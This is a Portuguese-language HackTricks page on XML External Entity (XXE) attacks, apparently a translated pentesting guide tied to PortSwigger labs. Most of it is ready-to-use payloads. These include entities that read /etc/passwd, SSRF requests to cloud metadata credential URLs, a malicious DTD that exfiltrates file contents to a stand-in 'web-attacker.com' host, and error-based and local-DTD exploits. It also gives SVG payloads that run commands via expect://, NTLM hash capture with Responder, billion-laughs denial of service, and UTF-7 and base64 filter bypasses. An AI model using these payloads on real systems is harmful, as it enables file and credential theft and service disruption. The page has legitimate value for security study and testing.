# XXE - XEE - Entidade Externa XML

<details>

<summary><strong>Aprenda hacking AWS do zero ao her√≥i com</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

Outras maneiras de apoiar o HackTricks:

* Se voc√™ deseja ver sua **empresa anunciada no HackTricks** ou **baixar o HackTricks em PDF** Confira os [**PLANOS DE ASSINATURA**](https://github.com/sponsors/carlospolop)!
* Adquira o [**swag oficial PEASS & HackTricks**](https://peass.creator-spring.com)
* Descubra [**A Fam√≠lia PEASS**](https://opensea.io/collection/the-peass-family), nossa cole√ß√£o exclusiva de [**NFTs**](https://opensea.io/collection/the-peass-family)
* **Junte-se ao** üí¨ [**grupo Discord**](https://discord.gg/hRep4RUj7f) ou ao [**grupo telegram**](https://t.me/peass) ou **siga-me** no **Twitter** üê¶ [**@carlospolopm**](https://twitter.com/carlospolopm)**.**
* **Compartilhe seus truques de hacking enviando PRs para o** [**HackTricks**](https://github.com/carlospolop/hacktricks) e [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) reposit√≥rios do github.

</details>

Um ataque de Entidade Externa XML √© um tipo de ataque contra uma aplica√ß√£o que analisa a entrada XML.

## Conceitos B√°sicos de XML

**A maior parte disso √© baseada nesta incr√≠vel p√°gina da Portswigger:** [**https://portswigger.net/web-security/xxe/xml-entities**](https://portswigger.net/web-security/xxe/xml-entities)

### Vis√£o Geral da Linguagem de Marca√ß√£o Extens√≠vel <a href="#overview-of-extensible-markup-language" id="overview-of-extensible-markup-language"></a>

A Linguagem de Marca√ß√£o Extens√≠vel, comumente abreviada como XML, √© definida como uma linguagem de marca√ß√£o utilizada para o armazenamento e transporte de dados. Empregando uma estrutura semelhante a uma √°rvore, composta por tags e dados semelhantes ao HTML, o XML se distingue por n√£o se restringir a tags predefinidas. Essa flexibilidade permite a utiliza√ß√£o de tags nomeadas descritivamente de acordo com os dados que encapsulam. Historicamente, o XML ganhou destaque como formato para transporte de dados, notavelmente representado por sua contribui√ß√£o para o acr√¥nimo "AJAX" (onde "X" significa "XML"). No entanto, sua popularidade diminuiu, com o JSON emergindo como o formato preferido.

### Representa√ß√£o de Itens de Dados em XML Atrav√©s de Entidades <a href="#representation-of-data-items-in-xml-through-entities" id="representation-of-data-items-in-xml-through-entities"></a>

No XML, as entidades servem como mecanismos para representar itens de dados dentro de um documento, oferecendo uma alternativa √† inser√ß√£o direta de dados. A especifica√ß√£o XML incorpora v√°rias entidades embutidas. Por exemplo, `&lt;` e `&gt;` servem para representar os caracteres `<` e `>`, respectivamente. Devido ao seu papel na demarca√ß√£o de tags XML, esses metacaracteres frequentemente precisam ser representados usando entidades quando aparecem dentro dos dados.

### Definindo Elementos XML

As declara√ß√µes de tipo de elemento s√£o cr√≠ticas no XML, pois estabelecem as diretrizes para a presen√ßa, tipos e sequenciamento de elementos dentro de um documento XML. Exemplos ilustrativos incluem:

- `<!ELEMENT stockCheck ANY>` significa que o elemento `<stockCheck></stockCheck>` pode conter qualquer tipo de objeto.
- `<!ELEMENT stockCheck EMPTY>` dita que o elemento `<stockCheck></stockCheck>` deve permanecer sem conte√∫do.
- `<!ELEMENT stockCheck (productId,storeId)>` especifica que o elemento `<stockCheck>` pode conter apenas `<productId>` e `<storeId>` como elementos filhos.

### Introdu√ß√£o √† Defini√ß√£o de Tipo de Documento <a href="#introduction-to-document-type-definition" id="introduction-to-document-type-definition"></a>

A Defini√ß√£o de Tipo de Documento (DTD) desempenha um papel fundamental no XML, fornecendo declara√ß√µes que podem ditar a estrutura de um documento XML, tipos de dados permitidos e muito mais. O elemento `DOCTYPE`, que √© opcional e posicionado no in√≠cio de um documento XML, pode declarar uma DTD. As DTDs podem ser categorizadas como "internas" quando totalmente incorporadas em um documento, "externas" quando carregadas de uma fonte externa, ou uma combina√ß√£o de ambas.

### Utiliza√ß√£o de Entidades Personalizadas em XML <a href="#utilization-of-custom-entities-in-xml" id="utilization-of-custom-entities-in-xml"></a>

O XML facilita a defini√ß√£o de entidades personalizadas dentro de uma DTD. Uma declara√ß√£o de exemplo:

`<!DOCTYPE foo [ <!ENTITY myentity "meu valor de entidade" > ]>`

Tal declara√ß√£o indica que a refer√™ncia de entidade `&myentity;` dentro do documento ser√° substitu√≠da por "meu valor de entidade".

### Incorpora√ß√£o de Entidades Externas em XML <a href="#incorporation-of-external-entities-in-xml" id="incorporation-of-external-entities-in-xml"></a>

Entidades externas em XML s√£o um subtipo de entidades personalizadas, caracterizadas por suas defini√ß√µes serem externas √† DTD. Essas entidades utilizam a palavra-chave `SYSTEM` e necessitam de uma URL especificando a localiza√ß√£o de onde o valor da entidade deve ser recuperado, potencialmente permitindo [ataques de entidade externa XML](https://portswigger.net/web-security/xxe).

### Explorando Entidades de Par√¢metro XML para Detec√ß√£o de XXE

Em cen√°rios em que as entidades padr√£o s√£o ineficazes para explorar vulnerabilidades de XXE devido √† valida√ß√£o ou endurecimento do analisador XML, as entidades de par√¢metro XML podem ser empregadas. Distinguidas pela inclus√£o de um caractere de porcentagem precedendo o nome da entidade e referenciadas usando o mesmo caractere, as entidades de par√¢metro XML s√£o exclusivamente referenciadas dentro da DTD. Elas podem facilitar a detec√ß√£o cega de XXE por meio de m√©todos out-of-band, exemplificados pela iniciativa de uma pesquisa DNS e solicita√ß√£o HTTP a um dom√≠nio controlado pelo atacante, confirmando assim o sucesso da explora√ß√£o.


## Principais ataques

**[A maioria desses ataques foi testada usando os incr√≠veis laborat√≥rios XEE da Portswiggers: https://portswigger.net/web-security/xxe](https://portswigger.net/web-security/xxe)**

### Novo teste de Entidade

Neste ataque, vou testar se uma simples nova declara√ß√£o de ENTIDADE est√° funcionando
```markup
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [<!ENTITY toreplace "3"> ]>
<stockCheck>
<productId>&toreplace;</productId>
<storeId>1</storeId>
</stockCheck>
```
### Ler arquivo

Vamos tentar ler `/etc/passwd` de diferentes maneiras. Para o Windows, voc√™ pode tentar ler: `C:\windows\system32\drivers\etc\hosts`

Neste primeiro caso, observe que o sistema "_\*\*file:///\*\*etc/passwd_" tamb√©m funcionar√°.
```markup
<!--?xml version="1.0" ?-->
<!DOCTYPE foo [<!ENTITY example SYSTEM "/etc/passwd"> ]>
<data>&example;</data>
```
Este segundo caso deve ser √∫til para extrair um arquivo se o servidor web estiver usando PHP (N√£o √© o caso dos laborat√≥rios do Portswiggers)
```markup
<!--?xml version="1.0" ?-->
<!DOCTYPE replace [<!ENTITY example SYSTEM "php://filter/convert.base64-encode/resource=/etc/passwd"> ]>
<data>&example;</data>
```
Neste terceiro caso, observe que estamos declarando o `Element stockCheck` como ANY.
```markup
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE data [
<!ELEMENT stockCheck ANY>
<!ENTITY file SYSTEM "file:///etc/passwd">
]>
<stockCheck>
<productId>&file;</productId>
<storeId>1</storeId>
</stockCheck3>
```
### Listagem de diret√≥rios

Em aplica√ß√µes baseadas em **Java**, pode ser poss√≠vel **listar o conte√∫do de um diret√≥rio** via XXE com um payload como (apenas solicitando o diret√≥rio em vez do arquivo):
```markup
<!-- Root / -->
<?xml version="1.0" encoding="UTF-8"?><!DOCTYPE aa[<!ELEMENT bb ANY><!ENTITY xxe SYSTEM "file:///">]><root><foo>&xxe;</foo></root>

<!-- /etc/ -->
<?xml version="1.0" encoding="UTF-8"?><!DOCTYPE root[<!ENTITY xxe SYSTEM "file:///etc/" >]><root><foo>&xxe;</foo></root>
```
### SSRF

Um XXE poderia ser usado para abusar de um SSRF dentro de uma nuvem
```markup
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [ <!ENTITY xxe SYSTEM "http://169.254.169.254/latest/meta-data/iam/security-credentials/admin"> ]>
<stockCheck><productId>&xxe;</productId><storeId>1</storeId></stockCheck>
```
### SSRF Cego

Usando a **t√©cnica previamente comentada** voc√™ pode fazer o servidor acessar um servidor que voc√™ controla para mostrar que ele √© vulner√°vel. Mas, se isso n√£o estiver funcionando, talvez seja porque **entidades XML n√£o s√£o permitidas**, nesse caso voc√™ poderia tentar usar **entidades de par√¢metros XML**:
```markup
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE test [ <!ENTITY % xxe SYSTEM "http://gtd8nhwxylcik0mt2dgvpeapkgq7ew.burpcollaborator.net"> %xxe; ]>
<stockCheck><productId>3;</productId><storeId>1</storeId></stockCheck>
```
### "Cego" SSRF - Exfiltrar dados fora de banda

**Nesta ocasi√£o, vamos fazer o servidor carregar um novo DTD com um payload malicioso que enviar√° o conte√∫do de um arquivo via solicita√ß√£o HTTP (para arquivos de v√°rias linhas, voc√™ poderia tentar exfiltr√°-lo via** _**ftp://**_**). Esta explica√ß√£o √© baseada no** [**laborat√≥rio da Portswigger aqui**](https://portswigger.net/web-security/xxe/blind)**.**

No DTD malicioso fornecido, uma s√©rie de etapas s√£o realizadas para exfiltrar dados:

### Exemplo de DTD Malicioso:
A estrutura √© a seguinte:
```xml
<!ENTITY % file SYSTEM "file:///etc/hostname">
<!ENTITY % eval "<!ENTITY &#x25; exfiltrate SYSTEM 'http://web-attacker.com/?x=%file;'>">
%eval;
%exfiltrate;
```
Os passos executados por esta DTD incluem:

1. **Defini√ß√£o de Entidades de Par√¢metro:**
   - Uma entidade de par√¢metro XML, `%file`, √© criada, lendo o conte√∫do do arquivo `/etc/hostname`.
   - Outra entidade de par√¢metro XML, `%eval`, √© definida. Ela declara dinamicamente uma nova entidade de par√¢metro XML, `%exfiltrate`. A entidade `%exfiltrate` √© configurada para fazer uma solicita√ß√£o HTTP para o servidor do atacante, passando o conte√∫do da entidade `%file` na string de consulta da URL.

2. **Execu√ß√£o de Entidades:**
   - A entidade `%eval` √© utilizada, levando √† execu√ß√£o da declara√ß√£o din√¢mica da entidade `%exfiltrate`.
   - A entidade `%exfiltrate` √© ent√£o usada, desencadeando uma solicita√ß√£o HTTP para a URL especificada com o conte√∫do do arquivo.

O atacante hospeda esta DTD maliciosa em um servidor sob seu controle, tipicamente em uma URL como `http://web-attacker.com/malicious.dtd`.

**Carga √ötil XXE:**
Para explorar uma aplica√ß√£o vulner√°vel, o atacante envia uma carga √∫til XXE:
```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [<!ENTITY % xxe SYSTEM "http://web-attacker.com/malicious.dtd"> %xxe;]>
<stockCheck><productId>3;</productId><storeId>1</storeId></stockCheck>
```
Este payload define uma entidade de par√¢metro XML `%xxe` e a incorpora dentro do DTD. Quando processado por um analisador XML, este payload busca o DTD externo no servidor do atacante. O analisador ent√£o interpreta o DTD inline, executando as etapas descritas no DTD malicioso e levando √† exfiltra√ß√£o do arquivo `/etc/hostname` para o servidor do atacante.


### Baseado em Erro (DTD Externo)

**Neste caso, vamos fazer o servidor carregar um DTD malicioso que mostrar√° o conte√∫do de um arquivo dentro de uma mensagem de erro (isso √© v√°lido apenas se voc√™ puder ver mensagens de erro).** [**Exemplo daqui.**](https://portswigger.net/web-security/xxe/blind)

Voc√™ pode acionar uma mensagem de erro de an√°lise XML contendo o conte√∫do do arquivo `/etc/passwd` usando um DTD externo malicioso da seguinte forma:
```markup
<!ENTITY % file SYSTEM "file:///etc/passwd">
<!ENTITY % eval "<!ENTITY &#x25; error SYSTEM 'file:///nonexistent/%file;'>">
%eval;
%error;
```
Este DTD realiza os seguintes passos:

* Define uma entidade de par√¢metro XML chamada `file`, contendo o conte√∫do do arquivo `/etc/passwd`.
* Define uma entidade de par√¢metro XML chamada `eval`, contendo uma declara√ß√£o din√¢mica de outra entidade de par√¢metro XML chamada `error`. A entidade `error` ser√° avaliada carregando um arquivo inexistente cujo nome cont√©m o valor da entidade `file`.
* Utiliza a entidade `eval`, o que faz com que a declara√ß√£o din√¢mica da entidade `error` seja realizada.
* Utiliza a entidade `error`, de modo que seu valor seja avaliado ao tentar carregar o arquivo inexistente, resultando em uma mensagem de erro contendo o nome do arquivo inexistente, que √© o conte√∫do do arquivo `/etc/passwd`.

Invocar o erro DTD externo com:
```markup
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [<!ENTITY % xxe SYSTEM "http://web-attacker.com/malicious.dtd"> %xxe;]>
<stockCheck><productId>3;</productId><storeId>1</storeId></stockCheck>
```
E voc√™ deve ver o conte√∫do do arquivo dentro da mensagem de erro da resposta do servidor web.

![](<../.gitbook/assets/image (223) (1).png>)

_**Por favor, note que o DTD externo nos permite incluir uma entidade dentro da segunda (****`eval`****), mas √© proibido no DTD interno. Portanto, voc√™ n√£o pode for√ßar um erro sem usar um DTD externo (geralmente).**_

### **Baseado em Erro (sistema DTD)**

E quanto √†s vulnerabilidades cegas de XXE quando as **intera√ß√µes out-of-band s√£o bloqueadas** (conex√µes externas n√£o est√£o dispon√≠veis)?.

Uma brecha na especifica√ß√£o da linguagem XML pode **expor dados sens√≠veis por meio de mensagens de erro quando o DTD de um documento mescla declara√ß√µes internas e externas**. Esse problema permite a redefini√ß√£o interna de entidades declaradas externamente, facilitando a execu√ß√£o de ataques de XXE baseados em erro. Tais ataques exploram a redefini√ß√£o de uma entidade de par√¢metro XML, originalmente declarada em um DTD externo, de dentro de um DTD interno. Quando as conex√µes out-of-band s√£o bloqueadas pelo servidor, os atacantes devem depender de arquivos DTD locais para realizar o ataque, com o objetivo de induzir um erro de an√°lise para revelar informa√ß√µes sens√≠veis.


Considere um cen√°rio em que o sistema de arquivos do servidor cont√©m um arquivo DTD em `/usr/local/app/schema.dtd`, definindo uma entidade chamada `custom_entity`. Um atacante pode induzir um erro de an√°lise XML revelando o conte√∫do do arquivo `/etc/passwd` enviando um DTD h√≠brido da seguinte forma:
```xml
<!DOCTYPE foo [
<!ENTITY % local_dtd SYSTEM "file:///usr/local/app/schema.dtd">
<!ENTITY % custom_entity '
<!ENTITY &#x25; file SYSTEM "file:///etc/passwd">
<!ENTITY &#x25; eval "<!ENTITY &#x26;#x25; error SYSTEM &#x27;file:///nonexistent/&#x25;file&#x27;>">
&#x25;eval;
&#x25;error;
'>
%local_dtd;
]>
```
Os passos delineados s√£o executados por esta DTD:

- A defini√ß√£o de uma entidade de par√¢metro XML chamada `local_dtd` inclui o arquivo DTD externo localizado no sistema de arquivos do servidor.
- Uma redefini√ß√£o ocorre para a entidade de par√¢metro XML `custom_entity`, originalmente definida no DTD externo, para encapsular um [exploit XXE baseado em erro](https://portswigger.net/web-security/xxe/blind#exploiting-blind-xxe-to-retrieve-data-via-error-messages). Esta redefini√ß√£o √© projetada para provocar um erro de an√°lise, expondo o conte√∫do do arquivo `/etc/passwd`.
- Ao empregar a entidade `local_dtd`, o DTD externo √© acionado, abrangendo a entidade `custom_entity` rec√©m-definida. Esta sequ√™ncia de a√ß√µes precipita a emiss√£o da mensagem de erro visada pelo exploit.


**Exemplo do mundo real:** Sistemas que utilizam o ambiente de desktop GNOME frequentemente possuem um DTD em `/usr/share/yelp/dtd/docbookx.dtd` contendo uma entidade chamada `ISOamso`.
```markup
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [
<!ENTITY % local_dtd SYSTEM "file:///usr/share/yelp/dtd/docbookx.dtd">
<!ENTITY % ISOamso '
<!ENTITY &#x25; file SYSTEM "file:///etc/passwd">
<!ENTITY &#x25; eval "<!ENTITY &#x26;#x25; error SYSTEM &#x27;file:///nonexistent/&#x25;file;&#x27;>">
&#x25;eval;
&#x25;error;
'>
%local_dtd;
]>
<stockCheck><productId>3;</productId><storeId>1</storeId></stockCheck>
```
Como essa t√©cnica usa um **DTD interno, voc√™ precisa encontrar um v√°lido primeiro**. Voc√™ pode fazer isso **instalando** o mesmo **SO / Software** que o servidor est√° usando e **procurando alguns DTDs padr√£o**, ou **obtendo uma lista** de **DTDs padr√£o** dentro dos sistemas e **verificando** se algum deles existe:
```markup
<!DOCTYPE foo [
<!ENTITY % local_dtd SYSTEM "file:///usr/share/yelp/dtd/docbookx.dtd">
%local_dtd;
]>
```
Para mais informa√ß√µes, consulte [https://portswigger.net/web-security/xxe/blind](https://portswigger.net/web-security/xxe/blind)

### Encontrando DTDs dentro do sistema

No seguinte reposit√≥rio incr√≠vel do github, voc√™ pode encontrar **caminhos de DTDs que podem estar presentes no sistema**:

{% embed url="https://github.com/GoSecure/dtd-finder/tree/master/list" %}

Al√©m disso, se voc√™ tiver a **imagem Docker do sistema da v√≠tima**, voc√™ pode usar a ferramenta do mesmo reposit√≥rio para **escanear** a **imagem** e **encontrar** o caminho dos **DTDs** presentes no sistema. Leia o [Readme do github](https://github.com/GoSecure/dtd-finder) para aprender como.
```bash
java -jar dtd-finder-1.2-SNAPSHOT-all.jar /tmp/dadocker.tar

Scanning TAR file /tmp/dadocker.tar

[=] Found a DTD: /tomcat/lib/jsp-api.jar!/jakarta/servlet/jsp/resources/jspxml.dtd
Testing 0 entities : []

[=] Found a DTD: /tomcat/lib/servlet-api.jar!/jakarta/servlet/resources/XMLSchema.dtd
Testing 0 entities : []
```
### XXE via Analisadores de Office Open XML

Para uma explica√ß√£o mais detalhada deste ataque, **verifique a segunda se√ß√£o deste [post incr√≠vel](https://labs.detectify.com/2021/09/15/obscure-xxe-attacks/) da Detectify**.

A capacidade de **fazer upload de documentos do Microsoft Office √© oferecida por muitas aplica√ß√µes web**, que ent√£o procedem a extrair certos detalhes desses documentos. Por exemplo, uma aplica√ß√£o web pode permitir que os usu√°rios importem dados fazendo upload de uma planilha no formato XLSX. Para que o analisador extraia os dados da planilha, ele inevitavelmente precisar√° analisar pelo menos um arquivo XML.

Para testar essa vulnerabilidade, √© necess√°rio criar um **arquivo do Microsoft Office contendo um payload XXE**. O primeiro passo √© criar um diret√≥rio vazio para o qual o documento pode ser descompactado.

Depois que o documento for descompactado, o arquivo XML localizado em `./unzipped/word/document.xml` deve ser aberto e editado em um editor de texto preferido (como o vim). O XML deve ser modificado para incluir o payload XXE desejado, frequentemente come√ßando com uma solicita√ß√£o HTTP.

As linhas XML modificadas devem ser inseridas entre os dois objetos XML raiz. √â importante substituir o URL por um URL monitor√°vel para as solicita√ß√µes.

Por fim, o arquivo pode ser compactado para criar o arquivo malicioso poc.docx. A partir do diret√≥rio "unzipped" previamente criado, o seguinte comando deve ser executado:

Agora, o arquivo criado pode ser enviado para a aplica√ß√£o web potencialmente vulner√°vel, e pode-se esperar que uma solicita√ß√£o apare√ßa nos logs do Burp Collaborator.


### Protocolo Jar

O protocolo `jar` est√° dispon√≠vel apenas em **aplica√ß√µes Java**. Ele permite acessar arquivos dentro de um arquivo **PKZIP** (`.zip`, `.jar`, ...) e funciona para arquivos locais e remotos:
```
jar:file:///var/myarchive.zip!/file.txt
jar:https://download.host.com/myarchive.zip!/file.txt
```
{% hint style="danger" %}
Ser capaz de acessar arquivos dentro de arquivos PKZIP √© **super √∫til para abusar do XXE via arquivos DTD do sistema.** Confira [esta se√ß√£o para aprender como abusar dos arquivos DTD do sistema](xxe-xee-xml-external-entity.md#error-based-system-dtd).
{% endhint %}

#### Nos bastidores

1. Faz uma solicita√ß√£o HTTP para carregar o arquivo zip. `https://download.host.com/myarchive.zip`
2. Salva a resposta HTTP em um local tempor√°rio. `/tmp/...`
3. Extrai o arquivo do arquivo zip.
4. L√™ o `file.zip`
5. Exclui arquivos tempor√°rios.

Observe que √© poss√≠vel interromper o fluxo no segundo passo. O truque √© nunca fechar a conex√£o ao servir o arquivo. [Essas ferramentas podem ser √∫teis](https://github.com/GoSecure/xxe-workshop/tree/master/24\_write\_xxe/solution): uma em python `slow_http_server.py` e outra em java `slowserver.jar`.

Depois que o servidor baixou seu arquivo, voc√™ precisa encontrar sua localiza√ß√£o navegando pelo diret√≥rio tempor√°rio. Sendo aleat√≥rio, o caminho do arquivo n√£o pode ser previsto com anteced√™ncia.

![Jar](https://gosecure.github.io/xxe-workshop/img/74fac3155d455980.png)

{% hint style="danger" %}
Escrever arquivos em um diret√≥rio tempor√°rio pode ajudar a **escalar outra vulnerabilidade que envolve uma travessia de caminho** (como inclus√£o de arquivo local, inje√ß√£o de modelo, XSLT RCE, desserializa√ß√£o, etc).
{% endhint %}

### XSS
```markup
<![CDATA[<]]>script<![CDATA[>]]>alert(1)<![CDATA[<]]>/script<![CDATA[>]]>
```
### DoS

#### Ataque de Bilh√µes de Risadas
```markup
<!DOCTYPE data [
<!ENTITY a0 "dos" >
<!ENTITY a1 "&a0;&a0;&a0;&a0;&a0;&a0;&a0;&a0;&a0;&a0;">
<!ENTITY a2 "&a1;&a1;&a1;&a1;&a1;&a1;&a1;&a1;&a1;&a1;">
<!ENTITY a3 "&a2;&a2;&a2;&a2;&a2;&a2;&a2;&a2;&a2;&a2;">
<!ENTITY a4 "&a3;&a3;&a3;&a3;&a3;&a3;&a3;&a3;&a3;&a3;">
]>
<data>&a4;</data>
```
#### Ataque Yaml
```markup
a: &a ["lol","lol","lol","lol","lol","lol","lol","lol","lol"]
b: &b [*a,*a,*a,*a,*a,*a,*a,*a,*a]
c: &c [*b,*b,*b,*b,*b,*b,*b,*b,*b]
d: &d [*c,*c,*c,*c,*c,*c,*c,*c,*c]
e: &e [*d,*d,*d,*d,*d,*d,*d,*d,*d]
f: &f [*e,*e,*e,*e,*e,*e,*e,*e,*e]
g: &g [*f,*f,*f,*f,*f,*f,*f,*f,*f]
h: &h [*g,*g,*g,*g,*g,*g,*g,*g,*g]
i: &i [*h,*h,*h,*h,*h,*h,*h,*h,*h]
```
#### Ataque de Explos√£o Quadr√°tica

![](<../.gitbook/assets/image (531).png>)

#### Obtendo NTML

Em hosts Windows, √© poss√≠vel obter o hash NTML do usu√°rio do servidor web configurando um manipulador responder.py:
```
Responder.py -I eth0 -v
```
e ao enviar a seguinte solicita√ß√£o
```
<!--?xml version="1.0" ?-->
<!DOCTYPE foo [<!ENTITY example SYSTEM 'file://///attackerIp//randomDir/random.jpg'> ]>
<data>&example;</data>
```
Ent√£o voc√™ pode tentar quebrar o hash usando o hashcat

## Superf√≠cies XXE Ocultas

### XInclude

Em alguns cen√°rios, **dados enviados pelo cliente s√£o incorporados em um documento XML por processos no lado do servidor antes do parsing**. Isso geralmente ocorre quando os dados do cliente s√£o integrados em uma **solicita√ß√£o SOAP de backend**, posteriormente manipulada por um servi√ßo SOAP no backend.

Realizar um ataque tradicional de XXE (Entidade Externa XML) prova ser desafiador nesses casos devido ao controle limitado sobre a totalidade do documento XML, especificamente a incapacidade de alterar ou introduzir um elemento `DOCTYPE`. No entanto, aproveitando o `XInclude`, um recurso do padr√£o XML que permite a montagem de um documento XML a partir de subdocumentos menores, apresenta uma solu√ß√£o alternativa. Esta abordagem permite um ataque de `XInclude` dentro de qualquer elemento de dados de um documento XML, tornando-o vi√°vel em casos em que o controle √© restrito a uma pe√ßa individual de dados incorporados em um documento XML gerado pelo servidor.

Para iniciar um ataque de `XInclude`, a inclus√£o do namespace `XInclude` √© necess√°ria, juntamente com a especifica√ß√£o do caminho do arquivo destinado √† inclus√£o. O exemplo a seguir demonstra como tal ataque pode ser estruturado:
```xml
productId=<foo xmlns:xi="http://www.w3.org/2001/XInclude"><xi:include parse="text" href="file:///etc/passwd"/></foo>&storeId=1
```
Verifique [https://portswigger.net/web-security/xxe](https://portswigger.net/web-security/xxe) para mais informa√ß√µes!

### SVG - Upload de Arquivo

Arquivos enviados por usu√°rios para determinadas aplica√ß√µes, que s√£o ent√£o processados no servidor, podem explorar vulnerabilidades na forma como os formatos de arquivo XML ou que cont√™m XML s√£o tratados. Formatos de arquivo comuns como documentos de escrit√≥rio (DOCX) e imagens (SVG) s√£o baseados em XML.

Quando os usu√°rios **enviam imagens**, essas imagens s√£o processadas ou validadas no servidor. Mesmo para aplica√ß√µes que esperam formatos como PNG ou JPEG, a **biblioteca de processamento de imagens do servidor tamb√©m pode suportar imagens SVG**. O SVG, sendo um formato baseado em XML, pode ser explorado por atacantes para enviar imagens SVG maliciosas, expondo assim o servidor a vulnerabilidades de XXE (Entidade Externa XML).

Um exemplo desse tipo de exploit √© mostrado abaixo, onde uma imagem SVG maliciosa tenta ler arquivos do sistema:
```xml
<svg xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink" width="300" version="1.1" height="200"><image xlink:href="file:///etc/hostname"></image></svg>
```
Outro m√©todo envolve tentar **executar comandos** atrav√©s do inv√≥lucro "expect" do PHP:
```xml
<svg xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink" width="300" version="1.1" height="200">
<image xlink:href="expect://ls"></image>
</svg>
```
Em ambos os casos, o formato SVG √© usado para lan√ßar ataques que exploram as capacidades de processamento XML do software do servidor, destacando a necessidade de valida√ß√£o de entrada robusta e medidas de seguran√ßa.

Verifique [https://portswigger.net/web-security/xxe](https://portswigger.net/web-security/xxe) para mais informa√ß√µes!

**Observa√ß√£o: a primeira linha do arquivo lido ou do resultado da execu√ß√£o aparecer√° DENTRO da imagem criada. Portanto, voc√™ precisa ser capaz de acessar a imagem que o SVG criou.**

### **PDF - Upload de Arquivo**

Leia o seguinte post para **aprender como explorar um XXE fazendo upload de um arquivo PDF**:

{% content-ref url="file-upload/pdf-upload-xxe-and-cors-bypass.md" %}
[pdf-upload-xxe-and-cors-bypass.md](file-upload/pdf-upload-xxe-and-cors-bypass.md)
{% endcontent-ref %}

### Content-Type: De x-www-urlencoded para XML

Se uma solicita√ß√£o POST aceita os dados em formato XML, voc√™ pode tentar explorar um XXE nessa solicita√ß√£o. Por exemplo, se uma solicita√ß√£o normal cont√©m o seguinte:
```markup
POST /action HTTP/1.0
Content-Type: application/x-www-form-urlencoded
Content-Length: 7

foo=bar
```
Ent√£o voc√™ pode ser capaz de enviar a seguinte solicita√ß√£o, com o mesmo resultado:
```markup
POST /action HTTP/1.0
Content-Type: text/xml
Content-Length: 52

<?xml version="1.0" encoding="UTF-8"?><foo>bar</foo>
```
### Content-Type: De JSON para XEE

Para alterar a solicita√ß√£o, voc√™ pode usar uma Extens√£o do Burp chamada "**Content Type Converter**". [Aqui](https://exploitstube.com/xxe-for-fun-and-profit-converting-json-request-to-xml.html) voc√™ pode encontrar este exemplo:
```markup
Content-Type: application/json;charset=UTF-8

{"root": {"root": {
"firstName": "Avinash",
"lastName": "",
"country": "United States",
"city": "ddd",
"postalCode": "ddd"
}}}
```

```markup
Content-Type: application/xml;charset=UTF-8

<?xml version="1.0" encoding="UTF-8" standalone="no"?>
<!DOCTYPE testingxxe [<!ENTITY xxe SYSTEM "http://34.229.92.127:8000/TEST.ext" >]>
<root>
<root>
<firstName>&xxe;</firstName>
<lastName/>
<country>United States</country>
<city>ddd</city>
<postalCode>ddd</postalCode>
</root>
</root>
```
Outro exemplo pode ser encontrado [aqui](https://medium.com/hmif-itb/googlectf-2019-web-bnv-writeup-nicholas-rianto-putra-medium-b8e2d86d78b2).

## Bypasses de WAF e Prote√ß√µes

### Base64
```markup
<!DOCTYPE test [ <!ENTITY % init SYSTEM "data://text/plain;base64,ZmlsZTovLy9ldGMvcGFzc3dk"> %init; ]><foo/>
```
Isso s√≥ funciona se o servidor XML aceitar o protocolo `data://`.

### UTF-7

Voc√™ pode usar a \[**"Receita de Codifica√ß√£o**" do cyberchef aqui ]\(\[[https://gchq.github.io/CyberChef/#recipe=Encode\_text%28'UTF-7](https://gchq.github.io/CyberChef/#recipe=Encode\_text%28'UTF-7) %2865000%29'%29\&input=PCFET0NUWVBFIGZvbyBbPCFFTlRJVFkgZXhhbXBsZSBTWVNURU0gIi9ldGMvcGFzc3dkIj4gXT4KPHN0b2NrQ2hlY2s%2BPHByb2R1Y3RJZD4mZXhhbXBsZTs8L3Byb2R1Y3RJZD48c3RvcmVJZD4xPC9zdG9yZUlkPjwvc3RvY2tDaGVjaz4)to]\([https://gchq.github.io/CyberChef/#recipe=Encode\_text%28'UTF-7 %2865000%29'%29\&input=PCFET0NUWVBFIGZvbyBbPCFFTlRJVFkgZXhhbXBsZSBTWVNURU0gIi9ldGMvcGFzc3dkIj4gXT4KPHN0b2NrQ2hlY2s%2BPHByb2R1Y3RJZD4mZXhhbXBsZTs8L3Byb2R1Y3RJZD48c3RvcmVJZD4xPC9zdG9yZUlkPjwvc3RvY2tDaGVjaz4%29to](https://gchq.github.io/CyberChef/#recipe=Encode\_text%28%27UTF-7%20%2865000%29%27%29\&input=PCFET0NUWVBFIGZvbyBbPCFFTlRJVFkgZXhhbXBsZSBTWVNURU0gIi9ldGMvcGFzc3dkIj4gXT4KPHN0b2NrQ2hlY2s%2BPHByb2R1Y3RJZD4mZXhhbXBsZTs8L3Byb2R1Y3RJZD48c3RvcmVJZD4xPC9zdG9yZUlkPjwvc3RvY2tDaGVjaz4%29to)) transformar para UTF-7.
```markup
<!xml version="1.0" encoding="UTF-7"?-->
+ADw-+ACE-DOCTYPE+ACA-foo+ACA-+AFs-+ADw-+ACE-ENTITY+ACA-example+ACA-SYSTEM+ACA-+ACI-/etc/passwd+ACI-+AD4-+ACA-+AF0-+AD4-+AAo-+ADw-stockCheck+AD4-+ADw-productId+AD4-+ACY-example+ADs-+ADw-/productId+AD4-+ADw-storeId+AD4-1+ADw-/storeId+AD4-+ADw-/stockCheck+AD4-
```

```markup
<?xml version="1.0" encoding="UTF-7"?>
+ADwAIQ-DOCTYPE foo+AFs +ADwAIQ-ELEMENT foo ANY +AD4
+ADwAIQ-ENTITY xxe SYSTEM +ACI-http://hack-r.be:1337+ACI +AD4AXQA+
+ADw-foo+AD4AJg-xxe+ADsAPA-/foo+AD4
```
### Bypass de Protocolo de Arquivo

Se a web estiver usando PHP, em vez de usar `file:/`, voc√™ pode usar **inv√≥lucros php** `php://filter/convert.base64-encode/resource=` para **acessar arquivos internos**.

